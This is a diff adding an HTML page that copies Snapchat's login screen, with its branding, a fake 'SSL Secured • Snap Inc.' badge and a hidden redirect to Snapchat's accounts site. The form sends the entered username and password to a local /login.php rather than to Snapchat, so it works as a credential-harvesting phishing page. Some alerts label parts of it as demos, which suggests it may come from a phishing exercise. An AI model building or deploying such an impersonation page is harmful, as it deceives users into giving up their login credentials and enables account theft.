@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #fef9e8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo svg {
+            width: 60px;
+            height: 60px;
+            fill: #000;
+        }
+        
+        .logo h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #000;
+            margin-top: 10px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 52px;
+            background: #f5f5f5;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            background: #eeeeee;
+            box-shadow: 0 0 0 2px #fffc00;
+        }
+        
+        .card input::placeholder {
+            color: #999;
+        }
+        
+        .card button {
+            background: #fffc00;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: all 0.2s;
+        }
+        
+        .card button:hover {
+            background: #e6e300;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0 20px;
+        }
+        
+        .forgot-row a {
+            color: #0066cc;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .qr-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            background: #f5f5f5;
+            border-radius: 12px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .qr-section:hover {
+            background: #eeeeee;
+        }
+        
+        .qr-icon {
+            font-size: 24px;
+        }
+        
+        .qr-text {
+            font-weight: 600;
+            color: #000;
+        }
+        
+        .qr-subtext {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .signup {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 15px;
+            color: #333;
+        }
+        
+        .signup a {
+            color: #0066cc;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e5e5;
+        }
+        
+        .divider::before {
+            margin-right: 12px;
+        }
+        
+        .divider::after {
+            margin-left: 12px;
+        }
+        
+        .social-buttons {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .social-btn {
+            flex: 1;
+            padding: 14px;
+            background: #f5f5f5;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .social-btn:hover {
+            background: #eeeeee;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #000;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #999;
+        }
+        
+        @media (max-width: 450px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .social-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- Snapchat Ghost Logo -->
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/>
+                <path d="M12 6c-3.3 0-6 2.7-6 6s2.7 6 6 6 6-2.7 6-6-2.7-6-6-6zm0 10c-2.2 0-4-1.8-4-4s1.8-4 4-4 4 1.8 4 4-1.8 4-4 4z"/>
+            </svg>
+            <h1>Snapchat</h1>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://accounts.snapchat.com">
+                
+                <input type="text" name="username" placeholder="Username" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <div class="forgot-row">
+                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot password?</a>
+                </div>
+                
+                <button type="submit">Log In</button>
+            </form>
+            
+            <div class="qr-section" onclick="alert('QR code login demo'); return false;">
+                <span class="qr-icon">📱</span>
+                <div>
+                    <div class="qr-text">Log in with QR code</div>
+                    <div class="qr-subtext">Scan with Snapchat app</div>
+                </div>
+            </div>
+            
+            <div class="divider">or continue with</div>
+            
+            <div class="social-buttons">
+                <button class="social-btn" onclick="alert('Google login demo'); return false;">
+                    <span>G</span> Google
+                </button>
+                <button class="social-btn" onclick="alert('Apple login demo'); return false;">
+                    <span>🍎</span> Apple
+                </button>
+            </div>
+            
+            <div class="signup">
+                New to Snapchat? <a href="#" onclick="alert('Signup demo'); return false;">Sign up</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>Snap Inc.</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Safety demo'); return false;">Safety</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please enter your username and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.background = '#eeeeee';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.background = '#f5f5f5';
+                }
+            });
+        });
+        
+        document.querySelector('input[name="username"]').addEventListener('input', function() {
+            // Snapchat usernames are lowercase
+            this.value = this.value.toLowerCase().replace(/[^a-z0-9._]/g, '');
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.querySelector('input[name="username"]').focus();
+        });
+    </script>
+</body>
+</html>
